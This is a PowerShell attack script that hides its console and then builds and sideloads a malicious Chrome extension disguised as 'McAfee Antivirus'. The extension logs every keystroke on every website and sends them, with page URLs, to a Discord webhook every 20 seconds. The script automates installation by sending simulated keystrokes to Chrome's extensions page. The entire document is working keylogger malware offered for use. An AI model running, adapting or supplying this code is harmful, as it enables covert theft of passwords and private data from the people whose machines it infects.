$hookurl = "$dc" # YOUR_WEBHOOK_HERE

# Hide the console
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle

if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
}
else {
    $Host.UI.RawUI.WindowTitle = 'hideme'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

# Webhook shortened URL handler
$hookurl = (irm $hookurl).url

# Create the extension file
$DirPath = "C:\Users\Public\Chrome"
New-Item -ItemType Directory -Path $DirPath

# Create the Main Javascript file (main.js)
$mainjs = @'
let keys = "";
const current = document.URL;
document.addEventListener("keydown", (event) => {
  const key = event.key;
  if (key === "Enter") {
    keys += "\n";
    return;
  }
  if (key === "Backspace") {
    keys = keys.slice(0, keys.length - 1);
    return;
  }
  if (key === "CapsLock" || key === "Shift") {
    return;
  }
  if (key === "Control") {
    keys += "[Ctrl]";
    return;
  }
  // Arrows
  if (key === "ArrowLeft") {
    keys += "[LeftArrow]";
    return;
  }
  if (key === "ArrowRight") {
    keys += "[RightArrow]";
    return;
  }
  if (key === "ArrowDown") {
    keys += "[DownArrow]";
    return;
  }
  if (key === "ArrowUp") {
    keys += "[UpArrow]";
    return;
  }
  // End arrows
  keys += key;
  saveKeysLocal();
});

window.setInterval(async () => {
  keys = getKeysLocal();
  if (keys == "") {
    return;
  }
  const message = `<${current}>\nLogged Keystrokes: ` + "```" + keys + "```";
  sendMessageToDiscord(discordWebhook, message);
  keys = "";
  saveKeysLocal();
}, 20000); // time in milliseconds

async function sendMessageToDiscord(webhook, msg) {
  await fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: msg,
    }),
  });
}

function saveKeysLocal() {
  localStorage.setItem("keys", keys);
}

function getKeysLocal() {
  return localStorage.getItem("keys");
}
'@
$mainjs | Out-File -FilePath "$DirPath/main.js" -Encoding utf8 -Force

# Create the service worker (background.js)
$backgroundjs = @'
chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    sendResponse(request);
  }
);
'@
$backgroundjs | Out-File -FilePath "$DirPath/background.js" -Encoding utf8 -Force

# Crwate the manifest file (manifest.json)
$manifest = @'
{
  "name": "McAfee Antivirus",
  "description": "Antivirus chrome extension made by McAfee. Browse securely on the internet!",
  "version": "2.2",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": [
        "*://*/*"
      ],
      "js": [
        "Webhook.js",
        "main.js"
      ]
    }
  ]
}
'@
$manifest | Out-File -FilePath "$DirPath/manifest.json" -Encoding utf8 -Force

#create the webhook file
"const discordWebhook = `"$hookurl`";" | Out-File -FilePath "C:\Users\Public\Chrome\Webhook.js" -Encoding utf8 -Force

# Send keys to manually open chrome and add extension
$wshell = New-Object -ComObject wscript.shell
Start-Process chrome.exe example.com
sleep 7
$wshell.AppActivate("chrome.exe")
$wshell.SendKeys("{TAB}") ;sleep -m 500
$wshell.SendKeys("{TAB}") ;sleep -m 500
$wshell.SendKeys("{TAB}") ;sleep -m 500
$wshell.SendKeys("chrome://extensions/") ;sleep -m 500
$wshell.SendKeys("{ENTER}") ;sleep 4
$wshell.SendKeys("{TAB}") ;sleep -m 500
$wshell.SendKeys(" ") ;sleep 2
$wshell.SendKeys("{TAB}") ;sleep -m 500
$wshell.SendKeys("{ENTER}") ;sleep 4
$wshell.SendKeys("C:\Users\Public\Chrome");sleep -m 500
$wshell.SendKeys("{ENTER}") ;sleep -m 1000
$wshell.SendKeys("{BACKSPACE}") ;sleep -m 500
$wshell.SendKeys("{ENTER}")

# Kill Chrome process
sleep 4
$wshell.SendKeys("%{F4}")

<#
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('%{F4}')
#>
